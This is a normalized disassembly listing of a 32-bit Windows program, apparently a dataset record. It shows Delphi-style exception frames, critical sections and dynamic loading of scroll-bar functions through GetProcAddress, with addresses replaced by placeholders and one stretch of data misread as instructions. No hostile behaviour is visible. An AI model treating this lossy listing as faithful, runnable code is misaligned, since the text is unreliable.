mov dl 0x1
mov eax [ r-xdata ]
call sub_42351c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_422690
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4054e8
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cb24
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4054e8
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cb24
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42351c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_422690
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42351c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_422690
mov ecx r-xdata
call sub_40552c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4236d4
lea eax [ ebp - 0xc ]
call sub_4054e8
lea eax [ ebp - 0x8 ]
call sub_4054e8
retn
sub edx 0xfffffff8
sub_4236ec
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42267c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42372c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42267c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42375c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4238ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42267c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423889
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4238f5
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42267c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
mov eax esi
xor edx edx
call sub_42267c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42267c
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42267c
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_4238fc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4239e1
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403f00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4239e8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404928
lea eax [ ebp - 0x8 ]
call sub_4054e8
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42267c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405500
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40552c
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42267c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405500
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40552c
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_423c18
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_423d0b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403f00
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d12
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404928
lea eax [ ebp - 0x10 ]
call sub_4054e8
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_40552c
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42267c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405500
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_40552c
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_423d30
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f00
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404928
lea eax [ ebp - 0x8 ]
call sub_4054e8
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40552c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42267c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405500
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_40552c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_423e8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_423f21
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403f00
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_423c18
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f28
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax ebx
call sub_42372c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42375c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4238fc
sub_423f4c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42267c
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42267c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413750
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42267c
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_413750
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_413750
sub_423fd8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_4236ec
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_4030f0
mov eax [ esi + 0x14 ]
call sub_4030f0
mov eax [ esi + 0x10 ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4054e8
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_42402c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424063
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42406a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_424074
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424099
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4240a0
retn
sub_4240ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4240dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4240e4
retn
mov eax [ rw-data ]
call sub_4030f0
sub_4240f0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_424124
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42414c
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_4243ce
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4243f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4243fc
retn
sub_424410
pop esp
inc esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 2 + 0x42 ] ah
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add ah bl
inc esp
inc edx
add al ah
inc esp
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x40 ] si
inc esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
inc esp
inc edx
add [ eax + eax ] bl
add [ eax ] al
adc [ edx + eax * 2 ] al
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x45240040 ] ah
inc edx
add [ ebp + eax * 2 + 0x42 ] dl
add [ eax + 0x45 ] ah
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_4244e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c0
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_424524
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_42457c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4245a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245a8
retn
sub_4245b4
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42456c
xor eax eax
push ebp
push sub_42476b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424772
mov eax [ rw-data ]
call sub_424574
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_424774
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42456c
xor eax eax
push ebp
push sub_424b27
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b2e
mov eax [ rw-data ]
call sub_424574
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_424ed8
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_424f00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424f48
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f4f
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_4030f0
call sub_4245b4
cmp [ rw-data ] 0x0
jg r-xdata
sub_424f70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424f95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f9c
retn
sub_424fa8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424fcd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424fd4
retn
sub_424fe0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425005
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42500c
retn
sub_425018
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42503d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425044
retn
sub_425050
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425075
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42507c
retn
sub_425088
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4250ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250b4
retn
sub_4250c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4250e5
push [ fs : eax ]
